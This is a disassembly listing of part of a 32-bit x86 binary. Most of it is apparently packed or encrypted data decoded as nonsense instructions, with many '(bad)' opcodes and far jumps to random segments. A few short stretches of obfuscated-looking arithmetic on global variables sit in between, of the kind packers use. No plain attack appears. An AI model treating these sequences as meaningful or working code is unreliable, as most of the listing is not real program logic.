  409861:	mov    esp,DWORD PTR [ebx-0x65f7cfa4]
  409867:	test   al,0x45
  409869:	lahf   
  40986a:	imul   ecx,esi,0x40cbe622
  409870:	jmp    0x4d65:0xd3acb92f
  409877:	int    0xd5
  409879:	sbb    al,BYTE PTR [ebp-0x2b13f9d5]
  40987f:	push   edx
  409880:	out    dx,eax
  409881:	mov    eax,0x96cad31c
  409886:	push   ds
  409887:	arpl   WORD PTR [esi+0x25edfda4],cx
  40988d:	mov    bl,0x95
  40988f:	retf   
  409890:	(bad)  
  409892:	in     eax,0xcb
  409894:	cmp    bh,ah
  409896:	jmp    0x3450:0x710b262f
  40989d:	jns    0x409823
  40989f:	shl    DWORD PTR [edx],1
  4098a1:	and    DWORD PTR [edi],ebx
  4098a3:	cmp    DWORD PTR [ecx+0x5f],esp
  4098a6:	(bad)  
  4098a7:	push   0xffffff90
  4098a9:	outs   dx,BYTE PTR ds:[esi]
  4098aa:	fiadd  WORD PTR ds:0xb4e780cf
  4098b0:	push   ss
  4098b1:	inc    edi
  4098b2:	mov    ebx,0xa62c5780
  4098b7:	ins    DWORD PTR es:[edi],dx
  4098b8:	inc    ebp
  4098b9:	(bad)  
  4098ba:	in     eax,0x27
  4098bc:	popa   
  4098bd:	mov    cl,0xa3
  4098bf:	or     DWORD PTR [esi+0x5e],0xffffff99
  4098c3:	imul   esp,esi,0x502ec048
  4098c9:	loop   0x40990c
  4098cb:	fist   WORD PTR [edi+0x62d09bfb]
  4098d1:	popa   
  4098d2:	pop    esp
  4098d3:	icebp  
  4098d4:	jns    0x4098b0
  4098d6:	or     DWORD PTR [ebx],ebp
  4098d8:	jecxz  0x4098ac
  4098da:	sub    eax,0xa5d0d0e4
  4098df:	fs (bad) 
  4098e1:	jmp    0x1b8374ad
  4098e6:	rcl    DWORD PTR [ecx-0x5182a212],cl
  4098ec:	fdiv   st,st(1)
  4098ee:	xchg   DWORD PTR [eax+esi*8-0x7d493637],edi
  4098f5:	jns    0x4098eb
  4098f7:	inc    esi
  4098f8:	adc    bl,cl
  4098fa:	or     esi,DWORD PTR ds:0xd5dc2abd
  409900:	inc    ebp
  409901:	and    bl,BYTE PTR [eax]
  409903:	mov    dl,0x66
  409905:	test   al,0x2b
  409907:	dec    ebp
  409908:	push   ecx
  409909:	adc    BYTE PTR [eax+0x2be5b647],0xb8
  409910:	and    BYTE PTR [ebx-0x6e4c9c11],0x4
  409917:	push   esi
  409918:	mov    bl,0x2d
  40991a:	in     al,dx
  40991b:	(bad)  
  40991c:	repz sub eax,0xf4235db5
  409922:	pop    ebp
  409923:	xchg   ecx,eax
  409924:	je     0x409972
  409926:	mov    edx,0x76d1cec
  40992b:	lods   eax,DWORD PTR ds:[esi]
  40992c:	es jecxz 0x409941
  40992f:	dec    ebp
  409930:	lods   al,BYTE PTR ds:[esi]
  409931:	loop   0x4098c1
  409933:	shl    dh,cl
  409935:	scas   al,BYTE PTR es:[edi]
  409936:	add    eax,0x9b0dc8a2
  40993b:	repz inc ebp
  40993d:	push   esp
  40993e:	adc    ah,cl
  409940:	and    DWORD PTR [eax],edx
  409942:	inc    edi
  409943:	jns    0x40992f
  409945:	push   eax
  409946:	xchg   esp,eax
  409947:	div    BYTE PTR [ecx]
  409949:	adc    eax,0x8d2e4928
  40994e:	dec    ebp
  40994f:	mov    ebx,0x177d3ae6
  409954:	sbb    DWORD PTR [ebp-0x72395937],edx
  40995a:	add    DWORD PTR [edx],ebp
  40995c:	mov    eax,0x6f0435d3
  409961:	in     eax,dx
  409962:	(bad)  
  409963:	mov    al,0x4c
  409965:	mov    esi,0xad2d174e
  40996a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40996b:	stos   BYTE PTR es:[edi],al
  40996c:	out    0x22,eax
  40996e:	lods   eax,DWORD PTR ds:[esi]
  40996f:	push   ebp
  409970:	jns    0x4099d3
  409972:	xor    al,0xcf
  409974:	mov    esi,0xa51d3ac2
  409979:	into   
  40997a:	cmp    bh,BYTE PTR [eax-0x44]
  40997d:	inc    ebp
  40997e:	add    DWORD PTR [esi+0x78a91fbd],edi
  409984:	jmp    0xb094020e
  409989:	into   
  40998a:	test   al,0xa1
  40998c:	enter  0x406e,0xd6
  409990:	sbb    eax,0xb4a2f7ff
  409995:	ja     0x4099b3
  409997:	push   ds
  409998:	push   esi
  409999:	call   0x86d165dc
  40999e:	xor    dh,BYTE PTR [ebx+0x2df62440]
  4099a4:	gs inc esi
  4099a6:	adc    ch,ah
  4099a8:	or     al,0x57
  4099aa:	not    DWORD PTR [edx-0x7de1af7e]
  4099b0:	gs (bad) 
  4099b3:	cmp    dh,dl
  4099b5:	adc    DWORD PTR [ebx],edx
  4099b7:	lods   eax,DWORD PTR ds:[esi]
  4099b8:	sar    BYTE PTR [ebx-0x2ac59a0e],1
  4099be:	jb     0x409a10
  4099c0:	jne    0x409a14
  4099c2:	fistp  DWORD PTR [edx+0x158951f8]
  4099c8:	jne    0x409972
  4099ca:	inc    edx
  4099cb:	add    BYTE PTR [ecx-0x48],dl
  4099ce:	lahf   
  4099cf:	cld    
  4099d0:	mov    ds:0x8505c705,eax
  4099d5:	test   al,0x42
  4099d7:	add    bl,bh
  4099d9:	dec    ecx
  4099da:	add    BYTE PTR [eax],al
  4099dc:	mov    DWORD PTR [ebp-0x4],eax
  4099df:	mov    DWORD PTR ds:0x42a875,edi
  4099e5:	mov    ecx,DWORD PTR [ebp-0x4]
  4099e8:	mov    DWORD PTR ds:0x42a7f9,0x12dd
  4099f2:	mov    DWORD PTR [ebp-0x8],0x4f35
  4099f9:	cmp    ecx,eax
  4099fb:	jne    0x40a060
  409a01:	xor    ecx,DWORD PTR ds:0x42a779
  409a07:	jmp    0x409cfa
  409a0c:	(bad)  
  409a0d:	retf   
  409a0e:	rcl    dh,1
  409a10:	xlat   BYTE PTR ds:[ebx]
  409a11:	fxch   st(2)
  409a13:	fst    DWORD PTR [ecx-0x5e13eb31]
  409a19:	scas   al,BYTE PTR es:[edi]
  409a1a:	scas   eax,DWORD PTR es:[edi]
  409a1b:	pop    esi
  409a1c:	mov    dh,0xf7
  409a1e:	js     0x409a98
  409a20:	push   edx
  409a21:	jle    0x409a9b
  409a23:	js     0x409a38
  409a25:	jle    0x409a37
  409a27:	and    ch,BYTE PTR [esp+eiz*2-0x42]
  409a2b:	cmp    BYTE PTR [ebx-0x64756b7f],ch
  409a31:	inc    eax
  409a32:	hlt    
  409a33:	test   BYTE PTR [edi+0x3b],0x20
  409a37:	sahf   
  409a38:	ficomp DWORD PTR [edx+0x5bdb6ba6]
  409a3e:	loopne 0x409a3f
  409a40:	pop    edi
  409a41:	pushf  
  409a42:	mov    ebp,0xa5a6d3ff
  409a47:	dec    ebx
  409a48:	push   ebx
  409a49:	cmp    bh,bh
  409a4b:	cmp    bh,BYTE PTR [ebx]
  409a4d:	nop
  409a4e:	test   al,0xbf
  409a50:	sub    esi,DWORD PTR [eax+eax*8+0xe]
  409a54:	cmp    ebp,DWORD PTR [ecx]
  409a56:	sub    DWORD PTR [eax],esi
  409a58:	js     0x409a5e
  409a5a:	fiadd  DWORD PTR [eax+0x4c75f6b4]
  409a60:	aam    0x1b
  409a62:	gs jl  0x409a88
  409a65:	adc    edi,0x56
  409a68:	mov    ch,0xea
  409a6a:	jecxz  0x409a9b
  409a6c:	mov    ebp,0xe8ba2e2e
  409a71:	add    cl,dl
  409a73:	out    0x2e,eax
  409a75:	dec    edx
  409a76:	mov    WORD PTR [edi],es
  409a78:	cmp    bh,BYTE PTR [eax]
  409a7a:	popf   
  409a7b:	es mov ch,0x73
  409a7e:	fwait
  409a7f:	ja     0x409aaf
  409a81:	cmp    esp,DWORD PTR [ecx-0x60]
  409a84:	xor    ecx,DWORD PTR [esi]
  409a86:	lea    esi,[edx+ebx*2-0x4a]
  409a8a:	xor    al,0xc6
  409a8c:	jne    0x409aa1
  409a8e:	sbb    eax,0x16065e7a
  409a93:	xchg   edx,eax
  409a94:	stos   DWORD PTR es:[edi],eax
  409a95:	jae    0x409a41
  409a97:	sti    
  409a98:	cmp    BYTE PTR [esi-0x3f],al
  409a9b:	cli    
  409a9c:	mov    ah,0xe
  409a9e:	(bad)  
  409a9f:	jp     0x409ab1
  409aa1:	push   0x4e
  409aa3:	aam    0x70
  409aa5:	lods   eax,DWORD PTR ds:[esi]
  409aa6:	icebp  
  409aa7:	sti    
  409aa8:	aas    
  409aa9:	mov    eax,ds:0xb74036d4
  409aae:	repnz mov al,0x4e
  409ab1:	outs   dx,DWORD PTR ds:[esi]
  409ab2:	mov    dh,0xc1
  409ab4:	aaa    
  409ab5:	mov    ah,ch
  409ab7:	cdq    
  409ab8:	and    ebp,DWORD PTR [ecx-0x411e80d5]
  409abe:	cld    
  409abf:	cmc    
  409ac0:	inc    ecx
  409ac1:	push   ecx
  409ac2:	pop    edi
  409ac3:	leave  
  409ac4:	das    
  409ac5:	stos   BYTE PTR es:[edi],al
  409ac6:	in     al,dx
  409ac7:	aad    0x90
  409ac9:	mov    bh,0xef
  409acb:	dec    edi
  409acc:	clc    
  409acd:	dec    ebp
  409ace:	call   0xdfc7:0xe4a7adc4
  409ad5:	mov    ch,0x70
  409ad7:	dec    ecx
  409ad8:	outs   dx,DWORD PTR ds:[esi]
  409ad9:	fdivr  QWORD PTR ds:0x662f9089
  409adf:	jbe    0x409b17
  409ae1:	std    
  409ae2:	out    dx,al
  409ae3:	pop    ss
  409ae4:	jg     0x409b15
  409ae6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ae7:	jmp    edi
  409ae9:	(bad)  
  409aea:	cmc    
  409aeb:	push   ebx
  409aec:	xchg   ebx,eax
  409aed:	(bad)
  409af0:	cmc    
  409af1:	(bad)  
  409af2:	push   ss
  409af3:	pop    esi
  409af4:	rcl    BYTE PTR [ebx-0x2b],1
  409af7:	mov    edx,0x82bc296a
  409afc:	fidivr WORD PTR [ebp+0x18]
  409aff:	loop   0x409b04
  409b01:	jae    0x409b54
  409b03:	inc    ebp
  409b04:	or     ch,BYTE PTR [edi-0x7d9194fd]
  409b0a:	scas   al,BYTE PTR es:[edi]
  409b0b:	cld    
  409b0c:	push   ebp
  409b0d:	inc    ecx
  409b0e:	arpl   WORD PTR [edi-0x49cea41b],sp
  409b14:	jno    0x409b3a
  409b16:	add    al,0xc1
  409b18:	push   eax
  409b19:	aad    0x88
  409b1b:	shr    BYTE PTR [ebp-0x3c5285ed],cl
  409b21:	pop    ebp
  409b22:	pop    ecx
  409b23:	iret   
  409b24:	rol    BYTE PTR [edx+0x27],0x17
  409b28:	enter  0xc3f5,0x9e
  409b2c:	mov    ecx,0x8a930150
  409b31:	lods   eax,DWORD PTR ds:[esi]
  409b32:	outs   dx,DWORD PTR ds:[esi]
  409b33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b34:	test   DWORD PTR [edi-0x256aa8a8],ecx
  409b3a:	cdq    
  409b3b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b3c:	add    eax,0x89cafb5d
  409b41:	dec    ebx
  409b42:	lahf   
  409b43:	dec    ebp
  409b44:	mov    edx,0xf671f7e4
  409b49:	push   ebx
  409b4a:	jp     0x409b63
  409b4c:	lea    esp,[ecx+0x4c]
  409b4f:	enter  0xa6b9,0x47
  409b53:	sbb    al,0x82
  409b55:	sbb    DWORD PTR [ebx-0x65],eax
  409b58:	fldcw  WORD PTR [ebx]
  409b5a:	jecxz  0x409bcb
  409b5c:	mov    BYTE PTR [ebp+0x0],dh
  409b5f:	push   ebx
  409b60:	repnz retf 0xe489
  409b64:	sti    
  409b65:	out    0xe2,eax
  409b67:	leave  
  409b68:	dec    edi
  409b69:	fs (bad) 
  409b6b:	test   al,0x3d
  409b6d:	(bad)  
  409b6e:	mov    eax,ds:0xd24ba599
  409b73:	cmp    DWORD PTR [edx+0x60],0xfe890abd
  409b7a:	mov    dh,0x96
  409b7c:	mov    bh,0xde
  409b7e:	xrelease mov DWORD PTR [esi-0x5f66b99e],edx
  409b85:	imul   edi,eax,0xe
  409b88:	cmp    esp,ecx
  409b8a:	adc    DWORD PTR [edx+esi*1-0x19bd7c6],0xffffff89
  409b92:	and    BYTE PTR [ecx+0x702233e0],dh
  409b98:	cmc    
  409b99:	sbb    DWORD PTR [edx+eiz*1-0x7],0x6193be2d
  409ba1:	repnz rol DWORD PTR [edi],1
  409ba4:	adc    DWORD PTR [eax],edi
  409ba6:	mov    al,ds:0xe1d54267
  409bab:	push   edi
  409bac:	(bad)  
  409bad:	pop    ds
  409bae:	data16 (bad) 
  409bb0:	retf   0xeeb3
  409bb3:	xor    DWORD PTR [eax-0x59],esp
  409bb6:	mov    ss,WORD PTR [edi-0x1b]
  409bb9:	repz xchg ebx,eax
  409bbb:	mov    al,0x43
  409bbd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409bbe:	mov    eax,0x4576dc56
  409bc3:	test   BYTE PTR [ecx+0xd53372c],bl
  409bc9:	repz and al,0x1c
  409bcc:	lods   eax,DWORD PTR ds:[esi]
  409bcd:	adc    edx,DWORD PTR [ecx-0x277cc649]
  409bd3:	mov    ebp,0xc74b79a0
  409bd8:	mov    ecx,DWORD PTR [edi-0x6080f348]
  409bde:	bound  ebx,QWORD PTR [eax]
  409be0:	pushf  
  409be1:	xchg   esi,eax
  409be2:	xlat   BYTE PTR ds:[ebx]
  409be3:	dec    edi
  409be4:	mov    ds:0xdeeed1cb,eax
  409be9:	test   al,0x72
  409beb:	jb     0x409c49
  409bed:	fwait
  409bee:	popa   
  409bef:	xor    al,0xa9
  409bf1:	jecxz  0x409c1e
  409bf3:	das    
  409bf4:	inc    esp
  409bf5:	mov    ebp,0xf9ee77ff
  409bfa:	mov    edi,0xbc207307
  409bff:	pop    edi
  409c00:	push   ebx
  409c01:	mov    cl,0x8e
  409c03:	or     ch,BYTE PTR [edi]
  409c05:	mov    dl,0x1c
  409c07:	call   ecx
  409c09:	add    DWORD PTR [esi+edx*8-0x2491e4d5],ecx
  409c10:	popf   
  409c11:	std    
  409c12:	imul   esi,DWORD PTR [edx],0x74bd5509
  409c18:	add    BYTE PTR [edi-0x22],cl
  409c1b:	fidivr WORD PTR [ebx+0x4f]
  409c1e:	add    ebp,DWORD PTR [ebp+0x3ed8318e]
  409c24:	(bad)  
  409c25:	(bad)  
  409c26:	cmp    edx,esp
  409c28:	mov    al,ds:0xec97fc7b
  409c2d:	loope  0x409bed
  409c2f:	jl     0x409c1f
  409c31:	push   cs
  409c32:	loope  0x409c2a
  409c34:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409c35:	loop   0x409ca4
  409c37:	ret    
  409c38:	pop    eax
  409c39:	stos   BYTE PTR es:[edi],al
  409c3a:	in     eax,dx
  409c3b:	xchg   DWORD PTR [edx+0x4387d69a],ebp
  409c41:	xor    ah,al
  409c43:	push   ebx
  409c44:	div    ah
  409c46:	fnstcw WORD PTR [ecx-0x34]
  409c49:	sar    ah,1
  409c4b:	shr    DWORD PTR [edx-0x5e],cl
  409c4e:	cwde   
  409c4f:	js     0x409cba
  409c51:	fsub   st(2),st
  409c53:	pop    esp
  409c54:	idiv   BYTE PTR [edx+0x65faba7d]
  409c5a:	inc    edi
  409c5b:	mov    ch,0xff
  409c5d:	xchg   ebp,eax
  409c5e:	cmc    
  409c5f:	or     eax,0x4d2854b
  409c64:	xlat   BYTE PTR ds:[ebx]
  409c65:	and    DWORD PTR [ebp-0x2],ebp
  409c68:	mov    eax,ds:0x4169bb3b
  409c6d:	adc    ah,BYTE PTR [ebx+0x4e]
  409c70:	sahf   
  409c71:	jge    0x409c98
  409c73:	pop    ds
  409c74:	xchg   ebp,eax
  409c75:	sahf   
  409c76:	jl     0x409c27
  409c78:	or     bh,dh
  409c7a:	pusha  
  409c7b:	pop    ebp
  409c7c:	push   esp
  409c7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c7e:	push   ebp
  409c7f:	pop    ebx
  409c80:	int    0x2b
  409c82:	dec    ebp
  409c83:	sub    eax,esp
  409c85:	dec    ebp
  409c86:	sub    DWORD PTR [eax+0xc],eax
  409c89:	push   es
  409c8a:	cld    
  409c8b:	lods   eax,DWORD PTR ds:[esi]
  409c8c:	in     al,dx
  409c8d:	pop    es
  409c8e:	aam    0xf3
  409c90:	pop    eax
  409c91:	dec    edi
  409c92:	fs mov eax,0x3ef61cee
  409c98:	xchg   esp,eax
  409c99:	outs   dx,DWORD PTR ds:[esi]
  409c9a:	xchg   ebp,eax
  409c9b:	pop    edi
  409c9c:	inc    esi
  409c9d:	cli    
  409c9e:	sub    al,0xa9
  409ca0:	jmp    0xd6e13632
  409ca5:	das    
  409ca6:	push   ecx
  409ca7:	mov    al,0xe7
  409ca9:	sbb    al,0x64
  409cab:	mov    bh,0xdf
  409cad:	sahf   
  409cae:	leave  
  409caf:	mov    dh,0x50
  409cb1:	(bad)
  409cb4:	imul   ah
  409cb6:	js     0x409cd8
  409cb8:	xchg   esi,eax
  409cb9:	popf   
  409cba:	add    edi,DWORD PTR [esi+ebp*8]
  409cbd:	fiadd  WORD PTR [esi+0x394de147]
  409cc3:	stc    
  409cc4:	xlat   BYTE PTR ds:[ebx]
  409cc5:	push   0x1d
  409cc7:	xor    al,0x70
  409cc9:	int    0x91
  409ccb:	adc    esp,DWORD PTR [ebx+eiz*4]
  409cce:	out    dx,eax
  409ccf:	mov    al,0x79
  409cd1:	jmp    0x409cb3
  409cd3:	icebp  
  409cd4:	and    ebp,ebp
  409cd6:	fisttp DWORD PTR ds:0x9672f2a7
  409cdc:	pop    esi
  409cdd:	into   
  409cde:	arpl   WORD PTR [esi-0x4d],ax
  409ce1:	jmp    0x409cdb
  409ce3:	clc    
  409ce4:	cmp    eax,0xc5d6b771
  409ce9:	aaa    
  409cea:	enter  0xe147,0xcb
  409cee:	adc    eax,0x7bf9832c
  409cf3:	jp     0x409c8f
  409cf5:	outs   dx,BYTE PTR ds:[esi]
  409cf6:	icebp  
  409cf7:	sub    bl,BYTE PTR [ebx+0x458b66b2]
  409cfd:	clc    
  409cfe:	sbb    DWORD PTR ds:0x42a779,0x42a805
  409d08:	mov    ecx,0x8a36
  409d0d:	xor    ax,cx
  409d10:	and    ecx,0x5dd3
  409d16:	mov    ecx,0x3afc
  409d1b:	add    ax,cx
  409d1e:	neg    ecx
  409d20:	mov    ecx,DWORD PTR [ebp+0x8]
  409d23:	or     DWORD PTR ds:0x42a77d,0x299c
  409d2d:	movzx  eax,ax
  409d30:	sbb    DWORD PTR ds:0x42a841,0x42a83d
  409d3a:	not    eax
  409d3c:	xor    DWORD PTR ds:0x42a831,0x55d1
  409d46:	and    eax,DWORD PTR [ecx]
  409d48:	jmp    0x40a03b
  409d4d:	ret    
  409d4e:	int3   
  409d4f:	leave  
  409d50:	(bad)  
  409d51:	(bad)  
  409d53:	rcr    ecx,cl
  409d55:	sahf   
  409d56:	inc    edx
  409d57:	imul   edx,DWORD PTR [edi-0x10554776],0xffffff88
  409d5e:	hlt    
  409d5f:	js     0x409dd9
  409d61:	push   edx
  409d62:	jle    0x409ddc
  409d64:	js     0x409dd5
  409d66:	pop    edx
  409d67:	in     al,dx
  409d68:	div    BYTE PTR [esi-0x323662ce]
  409d6e:	xchg   ecx,eax
  409d6f:	adc    BYTE PTR [eax-0x31],dh
  409d72:	rcr    BYTE PTR [ebx-0x5821ed77],0x7d
  409d79:	jbe    0x409d28
  409d7b:	add    BYTE PTR [edx+0x4c],dl
  409d7e:	mov    bh,BYTE PTR [eax+0x50e48dde]
  409d84:	sbb    al,0xf5
  409d86:	ret    
  409d87:	cmc    
  409d88:	xor    al,0x39
  409d8a:	sub    BYTE PTR [ebx+esi*1-0x675c2758],al
  409d91:	test   ah,ah
  409d93:	shl    DWORD PTR [edx],1
  409d95:	inc    edi
  409d96:	int    0x1c
  409d98:	pop    ds
  409d99:	mov    esp,DWORD PTR [ecx-0x21449f7d]
  409d9f:	mov    ecx,0x5a5200ec
  409da4:	cld    
  409da5:	aad    0xac
  409da7:	pop    ecx
  409da8:	fwait
  409da9:	sbb    al,0xd3
  409dab:	or     BYTE PTR [edx-0x40],bl
  409dae:	popa   
  409daf:	xchg   al,bl
  409db1:	rol    DWORD PTR [edi],0x1b
  409db4:	outs   dx,DWORD PTR ds:[esi]
  409db5:	mov    ecx,0x607d3b63
  409dba:	dec    edx
  409dbb:	xor    ah,ah
  409dbd:	ja     0x409dcd
  409dbf:	test   al,0xe5
  409dc1:	addr16 test al,0xfb
  409dc4:	mov    ebp,0xa60545e8
  409dc9:	inc    ebx
  409dca:	mov    ecx,0x40ae64f2
  409dcf:	fist   WORD PTR [edi+eax*4+0x5a]
  409dd3:	add    cl,0x1b
  409dd6:	and    al,0xbc
  409dd8:	and    DWORD PTR [edx],ebx
  409dda:	mov    bl,0xd5
  409ddc:	xchg   ecx,eax
  409ddd:	(bad)  
  409dde:	mov    esp,eax
  409de0:	aam    0x3b
  409de2:	pop    esi
  409de3:	xchg   esp,eax
  409de4:	push   ebp
  409de5:	loop   0x409da1
  409de7:	sub    al,0x30
  409de9:	mov    al,ds:0x6ba331ff
  409dee:	jle    0x409e3a
  409df0:	xchg   esi,eax
  409df1:	loope  0x409e48
  409df3:	xchg   ecx,eax
  409df4:	pop    ds
  409df5:	test   BYTE PTR [eiz*8-0x2a2bc23],dl
  409dfc:	adc    DWORD PTR [esi],esi
  409dfe:	sbb    al,0xe2
  409e00:	mov    edi,0xf1c6449f
  409e05:	mov    DWORD PTR [ebp+0x6b4f32fd],ebx
  409e0b:	stos   DWORD PTR es:[edi],eax
  409e0c:	call   0x22c44f9
  409e11:	sbb    al,0x76
  409e13:	(bad)  
  409e14:	jmp    0x409d9f
  409e16:	add    ebp,DWORD PTR [edi]
  409e18:	xor    DWORD PTR [bx+si+0x122b],ebp
  409e1d:	ror    BYTE PTR [edi+eax*4],0x3
  409e21:	std    
  409e22:	mov    al,0xda
  409e24:	xor    DWORD PTR [edi+edx*2],edx
  409e27:	or     al,dh
  409e29:	ins    BYTE PTR es:[edi],dx
  409e2a:	jnp    0x409e90
  409e2c:	pusha  
  409e2d:	stos   BYTE PTR es:[edi],al
  409e2e:	repnz or edx,DWORD PTR [edx+0x79]
  409e32:	mov    ecx,DWORD PTR [ebx]
  409e34:	push   cs
  409e35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409e36:	repnz and eax,0xc8ee89a0
  409e3c:	scas   al,BYTE PTR es:[edi]
  409e3d:	jle    0x409e54
  409e3f:	inc    ecx
  409e40:	inc    esi
  409e41:	cwde   
  409e42:	pop    ss
  409e43:	xchg   ecx,eax
  409e44:	dec    ebx
  409e45:	push   cs
  409e46:	inc    ebp
  409e47:	jmp    0xfcfb8448
  409e4c:	not    DWORD PTR [ebx-0x2f]
  409e4f:	fstp   DWORD PTR [ebx]
  409e51:	jmp    0x409e9c
  409e53:	(bad)  
  409e54:	xchg   edi,eax
  409e55:	add    DWORD PTR [eax-0x6b],esp
  409e58:	xchg   ecx,eax
  409e59:	mov    dl,0x65
  409e5b:	ins    DWORD PTR es:[edi],dx
  409e5c:	das    
  409e5d:	sub    DWORD PTR [ebx-0x58063e9b],ecx
  409e63:	mov    dl,0xdc
  409e65:	aad    0xe8
  409e67:	xchg   ebx,eax
  409e68:	es leave 
  409e6a:	dec    eax
  409e6b:	out    dx,al
  409e6c:	ja     0x409ee1
  409e6e:	adc    eax,0xba124eb1
  409e73:	mov    bh,0x2f
  409e75:	call   0x46ff967c
  409e7a:	mov    al,0x58
  409e7c:	mov    ebp,0xbea34930
  409e81:	fdivr  QWORD PTR [esi+0x4d]
  409e84:	push   ecx
  409e85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e86:	push   cs
  409e87:	cmp    edx,DWORD PTR [ebp-0x31]
  409e8a:	sti    
  409e8b:	popf   
  409e8c:	clc    
  409e8d:	fbstp  TBYTE PTR [edx+ebx*8]
  409e90:	in     eax,0x43
  409e92:	jno    0x409ecd
  409e94:	scas   eax,DWORD PTR es:[edi]
  409e95:	ins    BYTE PTR es:[edi],dx
  409e96:	(bad)  
  409e97:	nop
  409e98:	xor    al,0x13
  409e9a:	cmp    BYTE PTR [edi],bl
  409e9c:	xchg   edx,eax
  409e9d:	add    al,0xef
  409e9f:	ret    0x47d
  409ea2:	adc    BYTE PTR [edi],dh
  409ea4:	stos   DWORD PTR es:[edi],eax
  409ea5:	fisub  DWORD PTR [ecx+0x632a054f]
  409eab:	or     ecx,DWORD PTR [ecx+0x32]
  409eae:	in     al,0x36
  409eb0:	neg    DWORD PTR [ecx+0x15a5ff68]
  409eb6:	add    DWORD PTR [ecx-0x500e0776],0xec992d01
  409ec0:	mov    ah,0xb5
  409ec2:	inc    edx
  409ec3:	sahf   
  409ec4:	xor    al,BYTE PTR [eax+edx*8]
  409ec7:	sbb    bl,0x77
  409eca:	jo     0x409f34
  409ecc:	dec    esp
  409ecd:	dec    esi
  409ece:	shl    ch,1
  409ed0:	sbb    ebp,DWORD PTR [esi+esi*2+0x214a184a]
  409ed7:	loop   0x409e9d
  409ed9:	daa    
  409eda:	dec    esi
  409edb:	sbb    BYTE PTR ds:0x62cce49d,al
  409ee1:	xor    ebp,eax
  409ee3:	lock and eax,0xb073cd68
  409ee9:	fbld   TBYTE PTR [edx]
  409eeb:	jl     0x409f5d
  409eed:	dec    ebp
  409eee:	sbb    DWORD PTR [eax-0x4f04b2ef],0x87ed2e40
  409ef8:	jbe    0x409f08
  409efa:	shl    DWORD PTR [edx+0x40347934],1
  409f00:	mov    ecx,0xeb8361a0
  409f05:	sub    esp,DWORD PTR [esi-0x37]
  409f08:	sti    
  409f09:	add    cl,al
  409f0b:	or     al,0x76
  409f0d:	adc    eax,0xf7f43118
  409f12:	push   es
  409f13:	cli    
  409f14:	popf   
  409f15:	adc    bh,al
  409f17:	cmp    BYTE PTR [edx+eax*4+0x7f34c89a],cl
  409f1e:	mov    ah,0x5a
  409f20:	push   ds
  409f21:	add    al,0x9c
  409f23:	push   esi
  409f24:	pop    esi
  409f25:	aad    0xd4
  409f27:	push   ds
  409f28:	jne    0x409f50
  409f2a:	pop    esi
  409f2b:	pop    ecx
  409f2c:	xchg   ecx,eax
  409f2d:	and    al,0xc6
  409f2f:	addr16 clc 
  409f31:	fisttp QWORD PTR [esi+0x1fbf5d21]
  409f37:	maxps  xmm6,XMMWORD PTR [ebp+0x5c]
  409f3b:	lahf   
  409f3c:	mov    dl,BYTE PTR [eax]
  409f3e:	data16 add dh,al
  409f41:	add    eax,0x21fc6f60
  409f46:	mov    al,ds:0x16284f91
  409f4b:	sahf   
  409f4c:	repz icebp 
  409f4e:	es (bad) 
  409f50:	scas   al,BYTE PTR es:[edi]
  409f51:	shl    BYTE PTR [edi-0x4023559a],cl
  409f57:	push   ds
  409f58:	sbb    al,0xd3
  409f5a:	fs repnz mov al,0x9d
  409f5e:	fsub   QWORD PTR [eax]
  409f60:	pop    es
  409f61:	push   cs
  409f62:	mov    ecx,0xef3789ff
  409f67:	jl     0x409fcc
  409f69:	mov    edi,0xbf97d2d9
  409f6e:	push   edi
  409f6f:	pop    es
  409f70:	bnd je 0x409f73
  409f73:	nop
  409f74:	xchg   esi,eax
  409f75:	fisubr DWORD PTR [ecx-0x7d38d8b1]
  409f7b:	mov    eax,0x910897a0
  409f80:	mov    bh,0xc2
  409f82:	mov    eax,ds:0xef86ee5f
  409f87:	xchg   BYTE PTR [ebp-0x4ebd88b9],dl
  409f8d:	push   0x7e13a4df
  409f92:	dec    ebp
  409f93:	dec    ecx
  409f94:	mov    dh,0x4
  409f96:	pop    eax
  409f97:	xor    DWORD PTR [eax+0x424c3cb9],ebx
  409f9d:	xchg   esp,eax
  409f9e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f9f:	(bad)  
  409fa0:	xor    eax,edx
  409fa2:	mov    dh,0xef
  409fa4:	jg     0x409f70
  409fa6:	add    eax,0x7cc785b9
  409fab:	push   edi
  409fac:	sub    eax,0xaac3072
  409fb1:	push   ss
  409fb2:	pop    ss
  409fb3:	aas    
  409fb4:	dec    esp
  409fb5:	mov    al,0xfd
  409fb7:	retf   0x8ece
  409fba:	xchg   esp,eax
  409fbb:	test   al,0xad
  409fbd:	fcom   DWORD PTR [esi-0x4e7c8724]
  409fc3:	and    DWORD PTR ds:0x634f7693,ebp
  409fc9:	fwait
  409fca:	inc    edi
  409fcb:	jg     0x40a012
  409fcd:	mov    eax,0xda4cce69
  409fd2:	xor    bl,BYTE PTR [ebx+0x73]
  409fd5:	clc    
  409fd6:	jno    0x40a04d
  409fd8:	(bad)  
  409fd9:	adc    bl,BYTE PTR [edi+0x199940c8]
  409fdf:	xchg   DWORD PTR ds:0x1dba8c0a,ecx
  409fe5:	lea    edx,[eax-0x6cb1c325]
  409feb:	popa   
  409fec:	popa   
  409fed:	push   esi
  409fee:	add    al,0x3b
  409ff0:	stos   BYTE PTR es:[edi],al
  409ff1:	bound  esp,QWORD PTR [edi+0x83608f2]
  409ff7:	mov    bl,0xb0
  409ff9:	adc    al,0xa4
  409ffb:	lods   al,BYTE PTR ds:[esi]
  409ffc:	cs pop edi
  409ffe:	loop   0x40a071
  40a000:	jb     0x409f9c
  40a002:	in     al,dx
  40a003:	mov    eax,ds:0x8d4eebe1
  40a008:	imul   ebp,DWORD PTR [ebx],0xefe3cbfa
  40a00e:	push   0xffffffcd
  40a010:	test   al,0x37
  40a012:	rcr    DWORD PTR [edx],cl
  40a014:	in     al,dx
  40a015:	jno    0x40a005
  40a017:	mul    DWORD PTR [esi-0x6a]
  40a01a:	loop   0x409fb6
